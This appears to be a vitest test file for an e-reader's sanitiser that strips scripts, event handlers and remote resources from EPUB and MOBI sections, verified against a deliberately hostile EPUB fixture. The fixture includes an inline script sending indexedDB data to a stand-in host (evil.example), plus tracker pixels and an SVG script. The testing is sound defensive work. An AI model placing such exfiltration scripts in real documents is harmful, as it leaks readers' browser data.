// @vitest-environment jsdom
import { zipSync } from "fflate";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { guardBook, type GuardIo, type GuardableBook } from "@/lib/guard-book";
import { blockedTotal, mergeReports, emptyReport, UNCHECKABLE_SECTION } from "@/lib/safe-document";
import type { BlockedReport } from "@/lib/safe-document";

const enc = (s: string) => new TextEncoder().encode(s);

/** An EPUB built to do everything a hostile one could. */
function hostileEpub(): Record<string, Uint8Array> {
  return {
    mimetype: enc("application/epub+zip"),
    "META-INF/container.xml": enc(
      '<?xml version="1.0"?><container version="1.0" xmlns="urn:oasis:names:tc:opendocument:xmlns:container">' +
        '<rootfiles><rootfile full-path="OEBPS/content.opf" media-type="application/oebps-package+xml"/></rootfiles></container>',
    ),
    "OEBPS/content.opf": enc(
      '<?xml version="1.0"?><package xmlns="http://www.idpf.org/2007/opf" version="3.0" unique-identifier="id">' +
        '<metadata xmlns:dc="http://purl.org/dc/elements/1.1/"><dc:identifier id="id">urn:test:1</dc:identifier>' +
        "<dc:title>Hostile</dc:title><dc:language>en</dc:language></metadata><manifest>" +
        '<item id="ch1" href="ch1.xhtml" media-type="application/xhtml+xml" properties="scripted"/>' +
        '<item id="css" href="style.css" media-type="text/css"/>' +
        '<item id="js" href="app.js" media-type="text/javascript"/>' +
        '<item id="svg" href="logo.svg" media-type="image/svg+xml"/>' +
        '</manifest><spine><itemref idref="ch1"/></spine></package>',
    ),
    "OEBPS/ch1.xhtml": enc(
      '<?xml version="1.0"?><html xmlns="http://www.w3.org/1999/xhtml"><head><title>c</title>' +
        '<link rel="stylesheet" href="style.css"/>' +
        '<script>indexedDB.databases().then(d => fetch("https://evil.example/?"+d))</script>' +
        '<script src="app.js"></script></head><body><h1>Chapter</h1><p>Real text.</p>' +
        '<img src="https://tracker.example/pixel.gif" alt=""/>' +
        '<img src="logo.svg" onerror="steal()" alt=""/>' +
        '<a href="https://example.org/read-more">more</a></body></html>',
    ),
    "OEBPS/style.css": enc(
      '@import url("https://fonts.example/x.css"); body { background: url(https://tracker.example/bg.png); color: #111 }',
    ),
    "OEBPS/app.js": enc("document.title = 'pwned'"),
    "OEBPS/logo.svg": enc(
      '<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1"><script>alert(1)</script><rect width="1" height="1"/></svg>',
    ),
  };
}

type Epub = GuardableBook & {
  init(): Promise<unknown>;
  sections: { load(): Promise<string>; unload(): void }[];
};

const blobs = new Map<string, Blob>();
let counter = 0;

beforeEach(() => {
  blobs.clear();
  counter = 0;
  URL.createObjectURL = ((blob: Blob) => {
    const url = `blob:test/${++counter}`;
    blobs.set(url, blob);
    return url;
  }) as typeof URL.createObjectURL;
  URL.revokeObjectURL = vi.fn();
});
afterEach(() => vi.restoreAllMocks());

async function openEpub(): Promise<Epub> {
  const files = hostileEpub();
  const { EPUB } = (await import("foliate-js/epub.js")) as unknown as {
    EPUB: new (io: unknown) => Epub;
  };
  const book = new EPUB({
    loadText: (name: string) => (files[name] ? new TextDecoder().decode(files[name]) : null),
    loadBlob: (name: string) => (files[name] ? new Blob([files[name] as BlobPart]) : null),
    getSize: (name: string) => files[name]?.length ?? 0,
  });
  await book.init();
  return book;
}

const textOf = async (url: string) => blobs.get(url)!.text();

/** The first stylesheet URL the section references. */
async function loadedCss(sectionHtml: string): Promise<string> {
  const href = /<link[^>]*href="(blob:[^"]+)"/.exec(sectionHtml)?.[1];
  expect(href, "section links a blob: stylesheet").toBeTruthy();
  return textOf(href!);
}

describe("foliate's real EPUB loader", () => {
  it("WITHOUT the guard, hands a hostile section to the iframe untouched (the vulnerability)", async () => {
    const book = await openEpub();
    const html = await textOf(await book.sections[0]!.load());
    expect(html).toContain("indexedDB.databases()"); // inline script survives
    expect(html).toContain("onerror"); // inline handler survives
    expect(html).toContain("https://tracker.example/pixel.gif"); // remote image survives
    expect(await loadedCss(html)).toContain("https://tracker.example/bg.png");
  });

  it("WITH the guard, the same section is clean and the report says what was removed", async () => {
    const book = await openEpub();
    const reports = new Map<string, BlockedReport>();
    guardBook(book, (key, r) => reports.set(key, r));

    const html = await textOf(await book.sections[0]!.load());
    expect(html).not.toMatch(/indexedDB|<script|onerror|tracker\.example|evil\.example/);
    expect(html).toContain("Real text.");
    expect(html).toContain('http-equiv="Content-Security-Policy"');
    expect(html).toContain("https://example.org/read-more"); // link stays; guarded at click

    const css = await loadedCss(html);
    expect(css).not.toMatch(/tracker\.example|fonts\.example/);
    expect(css).toContain("color: #111"); // legitimate rules survive

    const total = [...reports.values()].reduce(mergeReports, emptyReport());
    // Per resource, so a miscount can't hide behind a total.
    expect(reports.get("OEBPS/ch1.xhtml")?.scripts).toBe(2); // inline + src="app.js"
    expect(reports.get("OEBPS/logo.svg")?.scripts).toBe(1);
    expect(reports.get("OEBPS/style.css")?.remote).toHaveLength(2);
    expect(total.handlers).toBe(1);
    expect(total.remote.map((r) => r.url)).toEqual(
      expect.arrayContaining([
        "https://tracker.example/pixel.gif",
        "https://tracker.example/bg.png",
        "https://fonts.example/x.css",
      ]),
    );
    expect(total.links).toEqual(["https://example.org/read-more"]);
  });

  it("cleans the SVG resource and never loads the book's own .js file", async () => {
    const book = await openEpub();
    guardBook(book, () => {});
    const html = await textOf(await book.sections[0]!.load());
    const svgUrl = /<img[^>]*src="(blob:[^"]+)"/.exec(html)?.[1];
    expect(svgUrl).toBeTruthy();
    expect(await textOf(svgUrl!)).not.toMatch(/script|alert/);
    // foliate itself refuses script items; the guard must not change that.
    expect(html).not.toContain("app.js");
  });

  it("stops hardening once disposed", async () => {
    const book = await openEpub();
    const dispose = guardBook(book, () => {});
    dispose();
    const html = await textOf(await book.sections[0]!.load());
    expect(html).toContain("indexedDB.databases()");
  });
});

describe("MOBI/AZW3-style books (section.load wrapper)", () => {
  const sourceFor = new Map<string, { text: string; type: string }>();
  const created: string[] = [];
  const revoked: string[] = [];
  const io: GuardIo = {
    read: async (url) => {
      const v = sourceFor.get(url);
      if (!v) throw new Error("unreadable");
      return v;
    },
    make: (markup, type) => {
      const url = `blob:safe/${created.length}`;
      created.push(url);
      sourceFor.set(url, { text: markup, type });
      return url;
    },
    revoke: (url) => void revoked.push(url),
  };

  beforeEach(() => {
    sourceFor.clear();
    created.length = 0;
    revoked.length = 0;
  });

  const makeBook = () => {
    const original = vi.fn(async () => "blob:orig/1");
    const unload = vi.fn();
    const book: GuardableBook = { sections: [{ id: "s1", load: original, unload }] };
    sourceFor.set("blob:orig/1", {
      type: "text/html",
      text: '<html><body><p>Kindle text</p><script>x()</script><img src="https://t/p.gif"></body></html>',
    });
    return { book, original, unload };
  };

  it("returns a hardened blob in place of the original and reports what it removed", async () => {
    const { book } = makeBook();
    const seen: BlockedReport[] = [];
    guardBook(book, (_k, r) => seen.push(r), io);
    const url = await book.sections![0]!.load!();
    expect(url).not.toBe("blob:orig/1");
    const served = sourceFor.get(url as string)!.text;
    expect(served).toContain("Kindle text");
    expect(served).not.toMatch(/<script|https:\/\/t\//);
    expect(blockedTotal(seen[0]!)).toBe(2);
  });

  it("reuses the hardened blob for a repeat load and revokes it on unload", async () => {
    const { book, unload } = makeBook();
    guardBook(book, () => {}, io);
    const first = await book.sections![0]!.load!();
    const second = await book.sections![0]!.load!();
    expect(second).toBe(first);
    book.sections![0]!.unload!();
    expect(revoked).toContain(first);
    expect(unload).toHaveBeenCalledTimes(1);
  });

  it("fails closed: an unreadable section becomes the stand-in, not the original", async () => {
    const { book } = makeBook();
    sourceFor.delete("blob:orig/1");
    guardBook(book, () => {}, io);
    const url = (await book.sections![0]!.load!()) as string;
    expect(url).not.toBe("blob:orig/1");
    expect(sourceFor.get(url)!.text).toBe(UNCHECKABLE_SECTION);
  });

  it("passes non-document resources straight through", async () => {
    const { book } = makeBook();
    sourceFor.set("blob:orig/1", { type: "image/png", text: "PNG" });
    guardBook(book, () => {}, io);
    expect(await book.sections![0]!.load!()).toBe("blob:orig/1");
  });

  it("dispose puts the original load/unload back and frees what it made", async () => {
    const { book, original } = makeBook();
    const dispose = guardBook(book, () => {}, io);
    const safe = (await book.sections![0]!.load!()) as string;
    dispose();
    expect(book.sections![0]!.load).toBe(original);
    expect(revoked).toContain(safe);
  });
});
